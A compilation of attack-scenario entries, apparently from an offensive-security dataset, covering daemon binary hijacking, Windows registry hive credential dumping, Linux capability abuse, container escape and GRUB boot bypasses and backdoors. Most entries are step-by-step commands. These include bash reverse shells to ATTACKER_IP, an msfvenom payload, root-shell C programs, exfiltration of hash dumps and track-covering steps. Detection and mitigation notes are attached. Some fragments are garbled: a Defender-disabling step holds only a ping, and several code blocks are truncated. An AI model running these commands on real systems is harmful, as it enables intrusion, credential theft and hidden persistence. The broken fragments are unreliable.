Title: Hijacking an Existing Daemon Executable
Scenario Description: This attack demonstrates how an adversary with write permissions to an existing daemon's binary (e.g., due to misconfigured file ownership or improper permissions) can replace the legitimate executable with a malicious payload. Once the daemon is started or restarted (manually or via system reboot), the malicious binary executes with elevated privileges (typically root), enabling privilege escalation or persistent backdoor access.
Tools Used: ✅ Linux Terminal✅ systemctl / service✅ chmod, chown✅ Reverse shell payload (msfvenom, nc) or custom script
Attack Steps: Step 1 – Identify a Writable Daemon ExecutableRun:find /etc/systemd/system /lib/systemd/system -type f -exec ls -l {} \; 2>/dev/nullLook for service files pointing to binaries that are world-writable or owned by non-root users.Step 2 – Inspect the Daemon ConfigurationExample:cat /etc/systemd/system/mydaemon.serviceCheck the ExecStart path, e.g., /usr/local/bin/mydaemonStep 3 – Check Executable Permissionsls -l /usr/local/bin/mydaemonIf writable:-rwxrwxrwx 1 user user 12345 /usr/local/bin/mydaemonProceed to replace.Step 4 – Backup the Original Executablecp /usr/local/bin/mydaemon /tmp/mydaemon_backupStep 5 – Create a Malicious ExecutableOption 1 – Bash reverse shell:echo -e '#!/bin/bash\nbash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' > /usr/local/bin/mydaemonOption 2 – Use msfvenom:msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f elf > /usr/local/bin/mydaemonStep 6 – Set Proper Permissionschmod +x /usr/local/bin/mydaemonStep 7 – Restart the Daemonsudo systemctl restart mydaemon.serviceOr:sudo service mydaemon restartStep 8 – Catch the Shell (Attacker Side)On attacker machine:nc -lvnp 4444Wait for reverse shell connection.Step 9 – Post-Exploitation (Ethical Scope)Check user identity:whoami → should return rootPerform necessary tests (e.g., privilege checks).Step 10 – CleanupRestore original binary:mv /tmp/mydaemon_backup /usr/local/bin/mydaemonRestart service:sudo systemctl restart mydaemon💡 Tip: This technique works when binaries are misconfigured as writable by non-privileged users – a critical configuration flaw.
Vulnerability: Writable daemon executable paths due to improper file permissions
MITRE Technique: T1574.010 – Hijack Execution Flow: Services File Permissions Weakness
Impact: Root privilege escalationBackdoor persistenceArbitrary code execution as root
Detection Method: - Monitor changes in system daemon binaries using tripwire, aide, or auditd- Use systemctl status logs and diff binaries- Check for unauthorized service behavior via journald (journalctl)
Solution: - Enforce correct file permissions (chmod 755)- Ensure daemon executables are owned by root and immutable if possible- Audit system services and binary paths regularly- Apply principle of least privilege
Source: GTFOBins, MITRE ATT&CK, Linux Hardening Guides

Title: Dump Using Built-in reg save Command
Scenario Description: On Windows systems, sensitive credential data like SAM (Security Account Manager), SYSTEM, and SECURITY hives are stored in the registry. If an attacker has administrative privileges or SYSTEM-level access, they can use the built-in reg save command to dump these hives for offline credential extraction using tools like Mimikatz or secretsdump.py. This technique does not require external tools and can be performed using default Windows utilities.

Attack Steps:
Step 1: Gain Local Admin or SYSTEM Access• Ensure attacker has Administrator or SYSTEM rights (via service exploit, privilege escalation, etc.)Step 2: Open CMD with Elevated Privileges• Start an elevated CMD shell (run as Administrator)Step 3: Create a Dump Foldercmd
mkdir C:\regdump
Step 4: Dump Registry HivesUse reg save to extract the hives:cmd
reg save HKLM\SAM C:\regdump\SAM
reg save HKLM\SYSTEM C:\regdump\SYSTEM
reg save HKLM\SECURITY C:\regdump\SECURITY
✅ Files will be saved in binary formatStep 5: Transfer the Dumps for Offline Extraction• Use SMB, scp, Netcat, etc., to exfiltrate the dumped files to the attacker’s machineStep 6: Extract Password HashesOption A: Use Mimikatzcmd
mimikatz.exe

lsadump::sam /system:C:\regdump\SYSTEM /sam:C:\regdump\SAM

secretsdump.py -system SYSTEM -sam SAM -security SECURITY LOCAL
Step 7: Use Extracted Hashes• Pass-the-Hash• Crack using hashcat or john• Reuse NTLM hashes for lateral movementStep 8: Cleanup (Ethical Use)• Delete the registry dump files:cmd
del /f /q C:\regdump\*
rmdir C:\regdump
Vulnerability: Abuse of reg save command to extract sensitive registry hives
MITRE Technique: T1003.002 – OS Credential Dumping: Security Account Manager
Impact: Offline password hash extraction, NTLM reuse, lateral movement, privilege escalation

Source: MITRE ATT&CK, Microsoft Docs, HackTricks, Red Team Notes

Attack Type: Credential Dumping via Offline Registry Access
Scenario Description: When an attacker gains physical access to a Windows system (or has a mounted disk image), they can extract critical registry hives — SAM, SYSTEM, and SECURITY — directly from C:\Windows\System32\Config, bypassing live system protections. These files store sensitive credential data like password hashes and can be used for offline credential dumping using tools like secretsdump.py or Mimikatz. This method is stealthier than live dumping and works even if the OS is not running.
Tools Used: ✅ Bootable USB with Linux or Kali✅ Disk mount tools (e.g., mount, FTK Imager)✅ Impacket secretsdump.py✅ Mimikatz✅ Physical or remote disk access
Attack Steps:
Step 1: Gain Physical or Disk Image Access• Remove the hard drive from the target system OR• Use virtualization snapshot OR• Mount an E01/RAW disk image via forensic toolsStep 2: Mount the Windows PartitionOn Linux:bash
mkdir /mnt/win
mount /dev/sdX1 /mnt/win
Step 3: Navigate to the Registry Hive Directorybash
cd /mnt/win/Windows/System32/config
ls -l
Look for:• SAM• SYSTEM• SECURITYStep 4: Copy the Registry Filesbash
cp SAM SYSTEM SECURITY ~/regdumps/
Step 5: Use Impacket’s secretsdump.py (Offline)bash
secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL
Output includes:• NTLM hashes• User account detailsStep 6: Optionally Use Mimikatzcmd
mimikatz
privilege::debug
lsadump::sam /sam:SAM /system:SYSTEM
Step 7: Use Extracted Hashes• Crack with hashcat or john• Pass-the-Hash with Metasploit or CrackMapExecStep 8: Cleanup (Ethical Use)• Securely delete copied files• Audit chain of custody if done in forensics🧠 Notes:• This method bypasses OS protections like Credential Guard or LSA Protection since it's offline• Can be used during incident response, DFIR, or red team physical engagements
Vulnerability: Registry hive files are world-readable when accessed offline from disk
Impact: Complete credential compromise including local admin, NTLM, and cached secrets
Detection Method: Monitor access to physical disksAudit logs for offline registry access attemptsBitLocker alerts on unauthorized boot device use
Solution: Enable full-disk encryption (BitLocker)Use BIOS passwordDisable boot from USBRestrict physical accessEncrypt backups and drive images
Source: MITRE ATT&CK, Microsoft Docs, Red Team Notes, HackTricks

Step 1: Gain SYSTEM Privileges• Confirm that the user is NT AUTHORITY\SYSTEM or Administrator.• Use privilege escalation methods (e.g., exploit, token impersonation, PsExec).Step 2: Disable Defender/EDR (for Lab Simulation Only)powershell

ping 192.168.1.10

Vulnerability: Weak protection of credential secrets over SMB and access via admin creds

Impact: Exposure of domain/local user hashes; offline cracking or direct abuse via pass-the-hash

Source: Impacket Docs, HackTricks, MITRE ATT&CK, Offensive Security Labs

Title: Direct Registry Read via PowerShell
Scenario Description: This simulation demonstrates how an attacker with local or remote access can use PowerShell to read sensitive registry hives directly from a Windows system. Common targets include SAM, SYSTEM, and SECURITY hives for credential data, and Run/RunOnce keys for persistence mechanisms. This technique is used in post-exploitation for privilege escalation or credential dumping.
Tools Used: ✅ PowerShell✅ Local or Remote Admin Access✅ Optional: SYSTEM shell
Attack Steps:
Step 1: Identify Access Level• Confirm you have local administrative privileges or SYSTEM shell.• Run in a high-integrity PowerShell session:powershell
whoami /groups
✅ Must have SeBackupPrivilege or be SYSTEM.Step 2: Open PowerShell with Admin Rights• Right-click PowerShell and run as administrator.Step 3: Read the SAM Hive• Attempt to directly access the SAM file:powershell
reg save HKLM\SAM C:\Temp\SAM.bak
reg save HKLM\SYSTEM C:\Temp\SYSTEM.bak
reg save HKLM\SECURITY C:\Temp\SECURITY.bak
✅ If successful, files will be created in C:\Temp.Step 4: Inspect Registry Keys for Credentials• Read values in PowerShell:powershell
Get-ItemProperty -Path "HKLM:\SAM\SAM\Domains\Account\Users"
• You may see hashed values for users (RID 500 = Administrator).Step 5: Enumerate AutoRun Entries• Check persistence keys:powershell
Get-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
✅ Used to detect userland persistence (malicious scripts, binaries, etc.)Step 6: Dump and Analyze• Export interesting registry paths:powershell
reg export "HKLM\SAM" C:\Temp\sam.reg
• You can now analyze the dumped hives offline with tools like SecretsDump, Mimikatz, or RegRipper.Step 7: (Optional) Use Volume Shadow Copy to Bypass Locked Files• Create a shadow copy:powershell
wmic shadowcopy call create Volume='C:\'
• Access locked SYSTEM/SAM files from the shadow volume path:powershell
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\Temp\SAM
🧠 This technique avoids traditional EDR detection since it uses built-in tools and reads from authorized keys or VSS.Step 8: Clean Up (If Lab)• Delete saved files:powershell
Remove-Item C:\Temp\SAM*
Remove-Item C:\Temp\SYSTEM*
Vulnerability: Unrestricted access to sensitive registry keys via PowerShell by privileged users
MITRE Technique: T1003.002 – OS Credential Dumping: SAMT1112 – Modify Registry
Impact: Exposure of user credentials (NTLM hashes), persistence mechanisms, or user behavior insights
Detection Method: - Monitor reg save, reg export, and PowerShell logging (Event ID 4104)- SIEM rules for access to SAM/SYSTEM paths- EDR alerts for access to sensitive registry hives
Solution: - Apply least privilege access- Block access to registry via AppLocker or GPO- Enable PowerShell logging and transcription- Harden Volume Shadow Copy access- Enable Credential Guard on endpoints
Source: MITRE ATT&CK, Microsoft Docs, Red Canary Labs

Title: Check for Misconfigured Capabilities
Scenario Description: This simulation explores how attackers can enumerate and exploit misconfigured file capabilities in Linux systems. Linux capabilities break down root privileges into discrete units and assign them to binaries. If a binary has inappropriate capabilities (e.g., cap_setuid, cap_sys_admin), a user may escalate to root or perform unauthorized actions. Common abuses include assigning capabilities to interpreters like Python or Bash.
Tools Used: ✅ Kali Linux or any Linux VM✅ getcap, setcap, capsh, find✅ Optional: python3, bash, nmap, perl binaries
Attack Steps:
Step 1: Enumerate All Files with CapabilitiesRun the following command to find all files with extended Linux capabilities:bash
sudo getcap -r / 2>/dev/null
✅ This lists binaries like /usr/bin/python3.8 = cap_setuid+ep.Step 2: Identify Dangerous CapabilitiesFocus on files with the following capabilities:• cap_setuid+ep → may allow privilege escalation• cap_dac_read_search+ep → bypass file permissions• cap_sys_admin+ep → highly privileged actionsStep 3: Analyze Context of Capable BinariesCheck:• Who owns the file (should NOT be world-writable)• What the binary is (e.g., interpreter, nmap, custom app)• Whether it's user-controllable or writableStep 4: Exploit Capable Interpreter (Example: Python)If Python or Perl has cap_setuid+ep, you can run:bash
python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
✅ This opens a root shell if setuid is enabled.Step 5: Abuse cap_dac_read_search+epThis allows you to read otherwise inaccessible files:bash
/path/to/binary /etc/shadow
✅ Useful for password hash extraction.Step 6: Check for Misuse of setcapIf you can use setcap, you can assign dangerous capabilities to harmless binaries:bash
sudo setcap cap_setuid+ep /usr/bin/python3.8
✅ This is often misconfigured or left enabled in CI/CD or DevOps setups.Step 7: Clean Up (If Ethical Lab)• Remove capabilities:bash
sudo setcap -r /usr/bin/python3.8
• Reset test environment permissions🧠 Pro Tip:• Many binaries like nmap, vim, or perl support shell escapes that become dangerous when given capabilities. Always audit interpreter binaries first.
Vulnerability: Misconfigured or excessive Linux capabilities on user-controlled binaries
MITRE Technique: T1548.001 – Abuse Elevation Control Mechanism: Setuid and Capabilities
Impact: Local privilege escalationBypass of file system restrictionsRoot shell access via user binaries
Detection Method: - Monitor file capabilities using getcap regularly- Audit for sensitive capabilities (cap_setuid, cap_sys_admin)- Log capability changes
Solution: - Restrict usage of setcap to root-only- Remove unnecessary capabilities- Monitor with file integrity tools (e.g., AIDE)- Avoid giving interpreters elevated capabilities
Source: MITRE ATT&CK, HackTricks, Linux man pages, GTFOBins

Title: Privilege Escalation via cap_setuid on Custom Binary
Scenario Description: This scenario explores how an attacker can escalate privileges by abusing a custom binary with the cap_setuid+ep capability. If a binary owned by a low-privileged user is granted this capability, it can set its UID to 0 and spawn a root shell. This attack is especially dangerous in development or CI/CD environments where developers or automation scripts have permission to modify binaries and assign capabilities.
Tools Used: ✅ Kali Linux or any Linux distro✅ gcc or any C compiler✅ setcap, getcap, id, bash
Attack Steps:
Step 1: Create a Privilege Escalation BinaryWrite a simple C program that sets UID to 0 and spawns a shell:c
#include
#include
#include
int main() {
setuid(0);
setgid(0);
system("/bin/bash");
return 0;
}
Step 2: Compile the Programbash
gcc -o rootme rootme.c
This will create a binary rootme in your current directory.Step 3: Assign cap_setuid Capabilitybash
sudo setcap cap_setuid+ep ./rootme
This grants the binary the ability to change its user ID to root.Step 4: Validate Capabilities Assignedbash
getcap ./rootme
Expected output:./rootme = cap_setuid+epStep 5: Execute the Binarybash
./rootme
If successful, you will drop into a root shell:bash
whoami
root
Step 6: Check for Contextual MisuseThis attack becomes critical when:• The binary is writable by non-root users• Capabilities are applied via automation (e.g., Docker, Jenkins build)• Shared development systems where capability audits are not enforcedStep 7: Cleanup (For Lab Environments)To remove the capability:bash
sudo setcap -r ./rootme
Delete the binary:bash
rm rootme
🧠 Pro Tip:Never assign cap_setuid+ep to interpreters like Python, Perl, or Bash. These allow arbitrary code execution as root. Always use statically compiled, trusted binaries.
Vulnerability: Misuse of Linux capabilities (cap_setuid) on user-modifiable binaries
MITRE Technique: T1548.001 – Abuse Elevation Control Mechanism: Setuid and Capabilities
Impact: - Local root shell- Full system control- Container escape (in some contexts)
Detection Method: - Use getcap -r / to scan files with dangerous capabilities- Monitor for non-root users assigning capabilities- Check for world-writable binaries with elevated caps
Solution: - Remove unnecessary cap_setuid assignments- Limit setcap usage to root only- Apply file integrity monitoring (AIDE, tripwire)- Harden CI/CD policies to prevent automated capability assignment
Source: HackTricks, GTFOBins, MITRE ATT&CK, Linux Capabilities Docs

Title: Read /etc/shadow via cap_dac_read_search
Scenario Description: This scenario simulates an attacker leveraging a binary with the cap_dac_read_search capability to bypass traditional UNIX file permission checks and access sensitive system files like /etc/shadow, which normally requires root access. If the binary is user-controlled or misconfigured, it can be abused to extract password hashes for offline cracking. This capability allows read access regardless of DAC (Discretionary Access Control) restrictions.
Tools Used: ✅ Linux system (Ubuntu/Kali)✅ gcc or C compiler✅ setcap, getcap, cat✅ hashcat/john (optional for hash cracking demo)
Attack Steps:
Step 1: Create a Simple Read BinaryWrite a minimal C program to read and print file contents:c
#include
#include
int main() {
FILE *fp = fopen("/etc/shadow", "r");
if (fp == NULL) { perror("fopen"); exit(1); }
char c;
while ((c = fgetc(fp)) != EOF) putchar(c);
fclose(fp);
return 0;
}
Step 2: Compile the Programbash
gcc -o readshadow readshadow.c
Step 3: Apply Capability to BinaryAssign the cap_dac_read_search capability:bash
sudo setcap cap_dac_read_search+ep ./readshadow
Step 4: Run as Unprivileged UserSwitch to a non-root user:bash
su - testuser
./readshadow
You should now be able to see the contents of /etc/shadow, including all user hashes.Step 5: (Optional) Crack the HashesSave the output and use john or hashcat:bash
john --wordlist=/usr/share/wordlists/rockyou.txt shadowdump.txt
Step 6: Cleanupbash
sudo setcap -r ./readshadow
rm readshadow readshadow.c
🧠 Notes:• This capability is extremely dangerous if granted to user-controlled or writable binaries.• File access happens outside of UNIX permission control.• This is often found misused in DevOps, CI/CD, or container setups.• NEVER grant cap_dac_read_search to interpreters (bash, python).
Vulnerability: Misconfigured cap_dac_read_search allowing bypass of file read permissions
MITRE Technique: T1548.001 – Abuse Elevation Control Mechanism: File and Directory Permissions Modification
Impact: - Leakage of /etc/shadow hashes- Offline brute-force or password cracking- Lateral movement via credential reuse
Detection Method: - Use getcap -r / to enumerate binaries with cap_dac_read_search- Monitor for unexpected read access to restricted files- Check file audit logs (auditd)
Solution: - Never assign cap_dac_read_search to user-modifiable binaries- Use file integrity monitoring- Enforce strict capability audit policies- Use AppArmor/SELinux to restrict sensitive file reads
Source: HackTricks, Linux Capabilities Docs, MITRE ATT&CK

Title: Full System Compromise via cap_sys_admin
Scenario Description: This simulation demonstrates how an attacker with access to a binary containing the cap_sys_admin Linux capability can escalate privileges to root, mount filesystems, escape containers, access arbitrary files, and manipulate kernel namespaces. This capability is referred to as "the new root" due to its wide-ranging system control powers. It is often accidentally left assigned in developer tools, monitoring agents, or container runtimes.
Tools Used: ✅ Linux machine (Ubuntu/Kali)✅ gcc or make✅ setcap, mount, losetup, bash, dd✅ getcap (for enumeration)
Attack Steps:
Step 1: Understand the Power of cap_sys_admincap_sys_admin grants the ability to perform mount operations, namespace control, raw I/O, and more. Binaries with this capability can escape confinement and even gain root under certain conditions.Step 2: Write an Exploit Binaryc
#include
int main() {
system("/bin/bash");
return 0;
}
Step 3: Compile the Binarybash
gcc -o rootsh rootsh.c
Step 4: Assign cap_sys_adminbash
sudo setcap cap_sys_admin+ep ./rootsh
Step 5: Abuse 1 – Mount /proc from Unprivileged ContextRun:bash
unshare -m ./rootsh
mount -t proc proc /proc
cat /proc/1/environ
This allows inspection of root environment from the host, which may leak secrets or tokens.Step 6: Abuse 2 – Mount a Filesystem and Modify Itbash
mkdir /tmp/hackmnt
dd if=/dev/zero of=disk.img bs=1M count=10
mkfs.ext4 disk.img
sudo mount -o loop disk.img /tmp/hackmnt
echo "hacked by $(whoami)" > /tmp/hackmnt/pwned.txt
sudo umount /tmp/hackmnt
This proves the binary can mount/unmount and manipulate filesystem state like root.Step 7: Abuse 3 – Escape Container or Jail (if applicable)If running inside a container or namespace-isolated environment, the binary can use namespace tricks:bash
unshare -Urm /bin/bash
mount -t proc proc /proc
cat /proc/1/cmdline
This allows viewing of host or container-level process trees.Step 8: (Optional) Escalate to Full Root via Kernel Interface ManipulationIf the binary also has access to /proc/kcore, /dev/mem, or /sys/kernel/debug, it may be possible to directly manipulate kernel memory. This step requires deep knowledge of kernel internals.Step 9: Cleanupbash
sudo setcap -r ./rootsh
rm rootsh rootsh.c disk.img
🧠 Notes:• This capability is more powerful than most realize.• Widely misconfigured in CI/CD binaries and container escape demos.• Never assign it unless absolutely required, and only to trusted, signed binaries.• Do not allow this in Docker or LXC without root awareness.
Target Type: Linux HostsContainerized EnvironmentsCI/CD Runners with Elevated Binaries
Vulnerability: Misconfigured or unsafe assignment of cap_sys_admin capability to untrusted binaries
MITRE Technique: T1548.001 – Abuse Elevation Control Mechanism: Capability Abuse
Impact: - Mounting sensitive filesystems- Kernel namespace manipulation- File overwrite and stealth access- Container or jail breakout
Detection Method: - Use getcap -r / to list dangerous capabilities- Audit logs for mount, unshare, losetup usage- Monitor capability assignments with OSSEC or Auditd
Solution: - Never grant cap_sys_admin to user-controlled binaries- Use AppArmor/SELinux profiles to confine binaries- Enforce binary signing and integrity validation- Remove or reduce unnecessary capabilities at deploy time
Source: HackTricks, Linux Capabilities Documentation, MITRE ATT&CK

Title: Break Out of Containers via Capabilities
Scenario Description: This scenario simulates an attacker breaking out of a Docker or LXC container due to over-permissive Linux capabilities like cap_sys_admin, cap_sys_ptrace, or cap_dac_read_search. Containers that run with these capabilities can be escaped by attackers to gain root access on the host system. These conditions are often present in poorly configured development or CI/CD environments.
Tools Used: ✅ Docker or LXC environment✅ Linux host with container runtime✅ Tools: getcap, unshare, nsenter, mount, bash, gcc
Attack Steps:
Step 1: Identify Capabilities from Inside ContainerRun capsh --print or check /proc/1/status inside the container to see capabilities assigned. You are particularly interested in dangerous ones like cap_sys_admin, cap_sys_ptrace, or cap_dac_override.Step 2: Confirm Kernel Isolation GapsEnsure the container shares certain kernel namespaces (host PID, user, or mount). Check with:lsns and cat /proc/1/ns/If PID or mount namespaces are not isolated, it's easier to attack the host.Step 3: Abuse cap_sys_admin to Mount Host FilesystemsTry mounting the host / into the container:bash
mkdir /mnt/host
mount -t proc proc /mnt/host/proc
cat /mnt/host/proc/1/cmdline # Check host process
Or:bash
mount /dev/sda1 /mnt/host # Try mounting disk
Success here means host access.Step 4: Use unshare to Escape into Host NamespaceIf you have cap_sys_admin, use:bash
unshare -Urm bash
mount -t proc proc /proc
cat /proc/1/cmdline # Inspect host init
This spawns a new shell with new namespaces. If user namespace is not properly restricted, you may remap to root.Step 5: Compile Helper for Further Escape (Optional)Create a C binary:c
#include
int main() { system("/bin/bash"); return 0; }
Compile:gcc -o escape escape.cUse this to simplify mount tricks.Step 6: Read Host Files via cap_dac_read_searchIf this capability is available, read sensitive files:cat /etc/shadowcat /root/.ssh/id_rsaStep 7: Use cap_sys_ptrace to Inject Code into Host ProcessesAttach to processes on host via PID:gdb -p 1 or use ptrace wrappers.This allows memory access and possible code injection into host-level processes.Step 8: Drop a Host Root Shell (if /host writable)Write a cron job or modify .bashrc inside /mnt/host/root to execute payload:bash
echo 'bash -i >& /dev/tcp//4444 0>&1' >> /mnt/host/root/.bashrc
Or write a reverse shell binary into /mnt/host/usr/local/bin and trigger from cron or startup scripts.Step 9: CleanupRemove traces:bash
rm escape
umount /mnt/host
🧠 Tip: Use AppArmor/SELinux auditing to track capability abuse attempts.
Vulnerability: Misconfigured Linux capabilities allowing namespace, file, or process manipulation
Impact: - Host privilege escalation- Root file read/write- Remote shell on host- Full system compromise
Detection Method: - Audit container capability sets- Monitor namespace syscalls- Log host access attempts from containers
Solution: - Drop all non-essential capabilities with --cap-drop=ALL- Use rootless containers- Enforce AppArmor/SELinux confinement- Avoid mounting host / or docker.sock
Source: HackTricks, Aqua Security Research, MITRE ATT&CK

Title: Custom Binary with Any Capability
Scenario Description: This scenario explores how attackers can exploit custom binaries assigned Linux capabilities (e.g., cap_sys_admin, cap_dac_override, or cap_setuid) instead of using full root privileges. These capabilities allow binaries to perform privileged operations and are often misconfigured by developers or sysadmins seeking limited privilege separation but end up unintentionally allowing full system compromise.
Tools Used: ✅ Linux host with setcap✅ GCC or any C compiler✅ getcap, setcap for capability assignment✅ Terminal
Attack Steps:
Step 1: Identify or Create a Custom BinaryAttacker starts by either locating an existing custom binary or compiling one. For example, create a binary that spawns a shell:c
#include
int main() { setuid(0); system("/bin/bash"); return 0; }
Compile with:gcc shell.c -o shellStep 2: Assign a Dangerous CapabilityAssuming the attacker has sudo or root access, or is abusing a misconfigured setup script, assign a Linux capability to the binary:sudo setcap cap_setuid+ep ./shellThis makes it possible for the binary to change its UID to root without needing the SUID bit.Step 3: Validate Capability AssignmentRun:getcap ./shellOutput should show:./shell = cap_setuid+epStep 4: Execute the Custom BinaryRun the binary:./shellIf designed properly and the capability is not blocked by security modules, this will drop the attacker into a root shell.Step 5: Other Capability OptionsIf using cap_dac_override, the attacker could bypass file permission checks:Binary example:c
#include
int main() {
FILE *f = fopen("/etc/shadow", "r");
if (f) {

fclose(f);

}
Set capability:setcap cap_dac_override+ep ./readshadowRun to read /etc/shadow without root.Step 6: Use cap_sys_admin for Host TakeoverWith cap_sys_admin, attackers can mount filesystems, create new namespaces, and execute host-level enumeration:mount /dev/sda1 /mntunshare -Urm bashStep 7: Cleanup (Ethical Use Only)After testing or exploitation, remove capabilities:setcap -r ./shellDelete custom binaries:rm ./shell ./readshadow🧠 Note: Developers may assign these capabilities during testing or in CI/CD but forget to remove them before deploying to production. Always verify binary capability assignments during security audits.
Vulnerability: Misconfigured capability assignments on custom or dev binaries
Impact: - Root shell access- Bypass of file permissions- System takeover- Lateral movement potential
Detection Method: - Audit for capabilities via getcap -r / 2>/dev/null- Monitor custom binaries with extended attributes- Use auditd or eBPF for execution tracking
Solution: - Use --cap-drop=ALL as default policy- Avoid assigning capabilities unless absolutely necessary- Restrict developer access on production systems
Source: HackTricks, Linux Man Pages, MITRE ATT&CK, GTFOBins

Title: Edit GRUB Entry to Boot into Single User Mode
Scenario Description: This attack demonstrates how a local attacker with physical or console access can edit the GRUB bootloader entry during system boot to gain root shell access by booting the system into single-user or emergency mode. If GRUB is not password protected, it allows an attacker to modify kernel parameters and bypass authentication mechanisms.
Tools Used: ✅ Physical or console access✅ Linux host (e.g., Ubuntu, CentOS, Debian)✅ Keyboard access at boot✅ Terminal, bash
Attack Steps: Step 1: Reboot the SystemAttacker physically reboots or forces a restart of the target Linux machine.Step 2: Interrupt GRUB at BootAs the system starts and GRUB menu appears (usually with OS list), press Esc or hold Shift to interrupt the boot process and enter GRUB menu.Step 3: Edit Boot EntryUse arrow keys to highlight the default boot entry (usually the top one).Press e to edit the boot parameters.Step 4: Modify Kernel ArgumentsScroll to the line starting with linux or linux16, which contains the kernel path and parameters.At the end of that line, add one of the following:→ single (older systems)→ init=/bin/bash (drops straight to root shell)→ systemd.unit=rescue.target or systemd.unit=emergency.target (for systemd systems)✅ Example:Original:linux /boot/vmlinuz... quiet splashModified:linux /boot/vmlinuz... init=/bin/bashStep 5: Boot with Modified ParametersPress Ctrl + X or F10 to boot the system with the modified kernel line.Step 6: Gain Root Shell AccessThe system boots into single-user mode or emergency shell.You now have root access without login prompt.→ If root filesystem is mounted as read-only, remount it:mount -o remount,rw /→ You can now:• Change root password: passwd root• Add a user: useradd attacker && passwd attacker• Enable SSH: systemctl start sshdStep 7: (Optional) Persist AccessModify /etc/sudoers, install backdoor, add SSH key, or enable networking.Step 8: CleanupIf attack is for testing, remove changes made to accounts and logs, and reboot system.⚠️ Real-world attackers often leave backdoors here.🧠 Important: This attack bypasses all user-level and some disk encryption protections if GRUB is unprotected. On encrypted systems, this attack fails unless attacker has access to encryption password.
Target Type: Linux SystemsPhysical MachinesVMs with Console Access
Vulnerability: Unprotected GRUB bootloader allows kernel parameter modification
MITRE Technique: T1548.003 – Abuse Elevation Control Mechanism: Boot or Logon Autostart Execution
Impact: - Full root shell without login- Change root passwords- Persist via backdoor- Disable security services
Detection Method: - Check /var/log/secure and journalctl -b for unauthorized boot modifications- Detect abnormal uptime/reset patterns
Solution: - Set GRUB bootloader password (grub-mkpasswd-pbkdf2)- Enable full disk encryption- Restrict physical access- Use secure boot policies
Source: MITRE ATT&CK, HackTricks, Linux Hardening Guides

Title: Bypass Forgotten Root Password
Scenario Description: This method is used to reset or bypass the root password on Linux systems where a user has physical or boot-level access, typically when the GRUB bootloader is unprotected by a password. This technique allows attackers or administrators to regain root control of a system without knowing the original root credentials. Commonly used in recovery or incident response situations.
Tools Used: ✅ Physical/console access✅ Linux system (Debian, Ubuntu, RHEL, etc.)✅ Keyboard & screen access
Attack Steps: Step 1: Reboot the SystemForce or initiate a reboot of the target machine.Step 2: Interrupt GRUB BootloaderDuring system startup, when GRUB appears, press and hold Shift or Esc (depends on distro) to bring up the GRUB menu.Step 3: Edit the Boot EntrySelect the default boot kernel (usually the top entry) and press e to edit it.Step 4: Modify Kernel ParametersLocate the line beginning with linux or linux16.At the end of this line, append one of the following:→ init=/bin/bash (bypass login, boot into root shell)→ or single (older distros, boot into single-user mode)✅ Example:linux /boot/vmlinuz... ro quiet splash → change to:linux /boot/vmlinuz... init=/bin/bashStep 5: Boot Into Modified SessionPress Ctrl+X or F10 to boot with the modified parameters.The system now boots into a minimal root shell.Step 6: Remount Root Filesystem as Read/WriteRun:mount -o remount,rw /Step 7: Reset Root PasswordSet a new root password:passwd rootEnter and confirm the new root password.Step 8: Sync and RebootFlush filesystem buffers:syncThen reboot:exec /sbin/init or simply power cycle.Step 9: Login NormallyAfter reboot, login as root using the newly set password.🛑 This process bypasses all user authentication if GRUB is not password protected or full disk encryption is absent. Should only be used for recovery or authorized audits.
Vulnerability: Insecure GRUB (no password) + unrestricted kernel parameter editing
MITRE Technique: T1548.003 – Abuse Elevation Control Mechanism: Boot-Level Bypass
Impact: - Full root account access- Credential reset- Access to all files and services
Detection Method: - Check for GRUB bootline modifications- Inspect uptime logs and password change events in auditd or journalctl
Solution: - Protect GRUB with bootloader password- Enable full disk encryption- Restrict physical/console access- BIOS/UEFI password + Secure Boot
Source: Linux Recovery Manuals, MITRE ATT&CK, HackTricks, Ubuntu Docs

Title: Persistent GRUB2 Backdoor via config edit
Scenario Description: This attack demonstrates how an attacker with physical or root-level access can modify the GRUB2 bootloader configuration to insert a persistent root shell or backdoor binary that launches during each boot. This allows privilege escalation, backdoor re-entry, or stealth persistence on reboot. It's highly effective against systems without GRUB2 password protection or full disk encryption.
Tools Used: ✅ Root access or live boot✅ Bash✅ Text editor (nano/vim)✅ Backdoor binary or shell script
Attack Steps: Step 1: Gain Root or Live Boot AccessIf you already have root, proceed. Otherwise, use a live USB/CD to boot into the system and mount the target Linux partition.Step 2: Locate GRUB ConfigurationFind the GRUB config stub:/etc/default/grubAlso note final compiled config:/boot/grub/grub.cfg (do not edit this directly).Step 3: Modify GRUB Default EntryEdit /etc/default/grub:Add or change:GRUB_CMDLINE_LINUX_DEFAULT="quiet splash init=/bin/bash"This ensures GRUB will pass the init=/bin/bash kernel parameter and spawn a root shell at boot.Step 4: (Optional) Add Auto-Execution of BackdoorCreate or copy a backdoor shell script or binary:/root/.backdoor.sh (example payload: reverse shell, keylogger, etc.)Make it executable:chmod +x /root/.backdoor.shNow edit /etc/default/grub to execute it:GRUB_CMDLINE_LINUX_DEFAULT="quiet splash init=/root/.backdoor.sh"Step 5: Regenerate GRUB ConfigRun:update-grub (Debian/Ubuntu)or:grub2-mkconfig -o /boot/grub2/grub.cfg (RHEL/CentOS)This rewrites the actual GRUB config used at boot.Step 6: Test Backdoor on RebootReboot the system. Instead of the normal login screen, the system will drop to a root shell or execute the backdoor script silently depending on the payload used.Step 7: Make Persistence Stealthier (Optional)To reduce visibility:• Hide .sh or rename to something like udevinit.sh• Change GRUB timeout to 0 to avoid menu• Suppress splash screen and boot messagesStep 8: Cover Tracks (Advanced)• Wipe .bash_history• Touch backdoor files with old timestamps• Remove or tamper with update-grub logs or /boot timestamps✅ Result: Persistent root-level backdoor that survives reboots and evades most basic detection tools.
Vulnerability: No GRUB2 passwordNo full disk encryptionWritable grub config files
MITRE Technique: T1542.003 – Boot or Logon Initialization Scripts
Impact: Persistent root accessBackdoor re-entryComplete system compromise
Detection Method: Inspect /etc/default/grub and /boot/grub/grub.cfg for unusual init= or unknown pathsAudit last modified times of boot files
